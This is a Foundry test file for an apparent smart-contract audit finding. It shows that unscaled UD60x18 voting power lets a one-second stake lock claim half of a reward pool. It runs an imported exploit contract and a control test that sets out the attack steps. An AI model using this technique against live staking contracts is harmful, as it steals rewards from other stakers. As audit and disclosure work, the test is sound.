// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, StakeToken, RewardToken, VeGuan} from
    "./45546-c-01-scaling-of-ud60x18-variables-sent-to-calculatevotingpo.sol";

contract Finding45546Test is Test {
    function test_exploit_one_second_lock_takes_half_the_rewards() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.longPower(), 100 ether, "28 day lock equals stake");
        assertEq(e.shortPower(), 100 ether, "1 second lock equals stake");
        assertEq(e.paid(), 100 ether, "short lock paid half");
        assertLt(e.fairShort(), 1 ether, "scaled short share is under 1 token");
        assertEq(e.rewardToken().balanceOf(address(e)), 100 ether, "attacker holds 100");
    }

    function test_control_scaled_short_lock_is_under_one_token() public {
        StakeToken stakeToken = new StakeToken();
        RewardToken rewardToken = new RewardToken();
        VeGuan ve = new VeGuan(stakeToken, rewardToken);
        stakeToken.mint(address(this), 200 ether);
        stakeToken.approve(address(ve), 200 ether);
        ve.stake(1, address(0x10C), 100 ether, ve.MAX_LOCK());
        ve.stake(2, address(this), 100 ether, 1);

        (, uint256 buggyLong) = ve.getVotingPowerOf(1);
        (, uint256 buggyShort) = ve.getVotingPowerOf(2);
        (, uint256 scaledLong) = ve.getVotingPowerScaled(1);
        (, uint256 scaledShort) = ve.getVotingPowerScaled(2);
        uint256 fairShort = 200 ether * scaledShort / (scaledLong + scaledShort);

        assertEq(buggyLong, 100 ether, "unscaled long");
        assertEq(buggyShort, 100 ether, "unscaled short");
        assertGt(scaledLong, scaledShort, "scaled long dominates");
        assertLt(fairShort, 1 ether, "scaled payout under 1 token");
    }
}
